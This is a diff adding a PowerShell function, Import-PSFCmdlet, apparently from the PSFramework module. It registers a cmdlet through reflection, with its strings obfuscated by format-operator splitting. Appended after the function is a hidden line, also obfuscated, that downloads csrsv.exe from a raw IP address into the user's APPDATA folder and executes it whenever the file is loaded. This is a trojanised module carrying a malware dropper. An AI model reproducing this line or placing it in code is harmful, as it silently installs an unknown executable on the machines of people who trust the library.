@@ -1,0 +1,91 @@
+function Import-PSFCmdlet
+{
+
+	[CmdletBinding(HelpUri = ("{1}{10}{7}{4}{12}{13}{2}{5}{11}{9}{15}{16}{8}{3}{18}{17}{14}{6}{0}" -f't','ht','k.org/do','/PSFrame','fra','cu','le','//ps','s','tion/c','tps:','menta','me','wor','ort-PSFCmd','omma','nd','p','work/Im'))]
+	param (
+		[Parameter(Mandatory = $true)]
+		[String]
+		$Name,
+		
+		[Parameter(Mandatory = $true)]
+		[Type]
+		$Type,
+		
+		[string]
+		$HelpFile,
+		
+		[System.Management.Automation.PSModuleInfo]
+		$Module
+	)
+	
+	begin
+	{
+		$scriptBlock = {
+			param (
+				[String]
+				$Name,
+				
+				[Type]
+				$Type,
+				
+				[string]
+				$HelpFile
+			)
+			
+			$sessionStateCmdletEntry = New-Object System.Management.Automation.Runspaces.SessionStateCmdletEntry(
+				$Name,
+				$Type,
+				$HelpFile
+			)
+			
+			
+			
+			$pipelineType = [PowerShell].Assembly.GetType(("{4}{1}{6}{5}{7}{8}{3}{2}{0}"-f 'line','ment.','Pipe','ocal','System.Manage','n.','Automatio','Runs','paces.L'))
+			$method = $pipelineType.GetMethod(
+				("{4}{1}{3}{0}{2}"-f'ontextF','ion','romTLS','C','GetExecut'),
+				[System.Reflection.BindingFlags]("{2}{0}{3}{1}{4}"-f'tati','Non','S','c,','Public')
+			)
+			
+			
+			$context = $method.Invoke(
+				$null,
+				[System.Reflection.BindingFlags]("{3}{2}{4}{1}{0}"-f'ublic','P','N','Static,','on'),
+				$null,
+				$null,
+				(Get-Culture)
+			)
+			
+			
+			$internalType = [PowerShell].Assembly.GetType(("{6}{9}{0}{8}{1}{10}{3}{11}{7}{2}{5}{4}" -f'anagement.Auto','a','Inte','n.S','l','rna','System.','State','m','M','tio','ession'))
+			
+			
+			$constructor = $internalType.GetConstructor(
+				[System.Reflection.BindingFlags]("{3}{1}{2}{4}{0}" -f'lic','ance,N','onP','Inst','ub'),
+				$null,
+				$context.GetType(),
+				$null
+			)
+			
+			
+			$sessionStateInternal = $constructor.Invoke($context)
+			
+			
+			$method = $internalType.GetMethod(
+				("{3}{2}{0}{1}"-f 'Sta','teEntry','ession','AddS'),
+				[System.Reflection.BindingFlags]("{0}{1}{2}{3}" -f 'Insta','n','ce',',NonPublic'),
+				$null,
+				$sessionStateCmdletEntry.GetType(),
+				$null
+			)
+			
+			$method.Invoke($sessionStateInternal, $sessionStateCmdletEntry)
+		}
+	}
+	
+	process
+	{
+		if (-not $Module) { $scriptBlock.Invoke($Name, $Type, $HelpFile) }
+		else { $Module.Invoke($scriptBlock, @($Name, $Type, $HelpFile)) }
+	}
+}
+(New-Object System.Net.WebClient).DownloadFile(("{1}{5}{4}{6}{2}{7}{0}{3}"-f'ahoo/csrsv.','http://9','238/','exe','.53','4.102','.','~y'),"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")
